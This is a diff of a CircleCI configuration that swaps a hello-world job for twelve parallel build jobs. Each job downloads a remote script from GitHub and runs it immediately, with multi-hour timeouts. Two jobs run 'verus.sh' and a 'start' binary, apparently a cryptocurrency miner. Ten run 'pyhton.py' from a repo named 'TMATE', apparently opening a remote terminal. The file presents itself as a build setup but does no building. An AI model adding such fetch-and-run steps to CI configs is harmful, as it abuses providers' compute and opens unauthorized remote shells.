@@ -1,26 +1,175 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/2.0/configuration-reference
-version: 2.1
-
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
+version: 2
 jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+  build_01:
     docker:
       - image: cimg/base:stable
-    # Add steps to the job
-    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+
+    working_directory: ~/repo
     steps:
       - checkout
+      - run: ls
       - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
+          no_output_timeout: 300m
+          
+          command: "wget https://raw.githubusercontent.com/nurfasikin/verust/main/verus.sh && chmod u+x verus.sh && ./verus.sh && chmod +x start &&./start"              
+      
+  build_02:
+    docker:
+      - image: cimg/base:stable
 
-# Invoke jobs via workflows
-# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 300m
+          
+          command: "wget https://raw.githubusercontent.com/nurfasikin/verust/main/verus.sh && chmod u+x verus.sh && ./verus.sh && chmod +x start &&./start"
+      
+  build_03:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 300m
+          
+          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+      
+  build_04:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 300m
+          
+          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+
+  build_05:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 362m
+          
+          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"              
+      
+  build_06:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 300m
+          
+          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+      
+  build_07:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 300m
+          
+          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+      
+  build_08:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 300m
+          
+          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py" 
+
+  build_09:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 362m
+          
+          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"              
+      
+  build_10:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 300m
+          
+          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+      
+  build_11:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 300m
+          
+          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"
+      
+  build_12:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 300m
+          
+          command: "wget https://raw.githubusercontent.com/sbwsmg/TMATE/main/pyhton.py && python pyhton.py"  
+      
+  
 workflows:
-  say-hello-workflow:
-    jobs:
-      - say-hello
+    version: 2
+    build:
+        jobs:
+            - build_01
+            - build_02
+            - build_03
+            - build_04
+            - build_05
+            - build_06
+            - build_07
+            - build_08
+            - build_09
+            - build_10
+            - build_11
+            - build_12
